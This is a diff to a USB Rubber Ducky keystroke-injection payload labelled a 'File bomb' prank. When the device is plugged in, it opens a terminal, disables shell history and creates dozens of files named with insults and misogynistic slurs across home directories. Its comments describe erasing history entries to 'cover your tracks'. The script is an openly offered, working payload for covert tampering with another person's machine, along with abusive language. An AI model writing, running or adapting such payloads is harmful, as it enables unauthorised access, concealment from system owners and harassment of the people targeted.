@@ -1,9 +1,20 @@
-REM FalsePhilosopher
-REM used gpt3 to generate longer word list for a meaner script. Apparently I can only get it to say poopoo head over and over, so this is what I mined lol.
-REM target linux
+REM Title: File bomb
+REM Author: FalsePhilosopher
+REM Target:  Unix-like tested on kubuntu 22.04
+REM Props: Hak5, strippers and memes
+REM Version: 1.0
+REM Category: Prank
+REM changes to all the main dir's in home, then home, then root and creates negative named files in each
+REM
+REM initialization delay
+DELAY 300
+REM Minimize all windows as that ensures launch happens smoother.
+WINDOWS d
 DELAY 300
 CTRL-ALT t
-DELAY 1000
+REM adjust delay as needed
+DELAY 1500
+REM sneak +1 don't delete the whole history or mess with settings, just turn history off and delete the last entry ;)
 STRING set +o history
 DELAY 200
 ENTER
@@ -12,6 +23,8 @@ STRING cd /Home/Pictures
 DELAY 200
 ENTER
 DELAY 200
+REM used gpt3 to generate longer word list for a meaner script. Apparently I can only get it to say poopoo head over and over, so this is what I mined lol.
+REM
 STRING touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick poopoo_breath cum_dumpster fart_breath ass_eater turd_burglar butt_munch crap_monster turd_face shit_stain shit_eater asshat asshole fuck_stick slut whore cunt dickhead shit_weasel prick motherfucker whorebag dickwad fucktard shitstain butt_pirate skank_fuck whore_monger dickwad shit_stain
 DELAY 300
 ENTER
@@ -63,6 +76,7 @@ STRING touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mo
 DELAY 300
 ENTER
 DELAY 500
+REM sneak +1 cover your tracks
 STRING history | grep history
 DELAY 200
 ENTER
@@ -76,3 +90,4 @@ DELAY 200
 STRING set -o history && exit
 DELAY 200
 ENTER
+REM to make your friends not hate you make a ducky going to each dir and rm copy paste the list, so basically do it in reverse with rm. Will add those versions later when I get time.
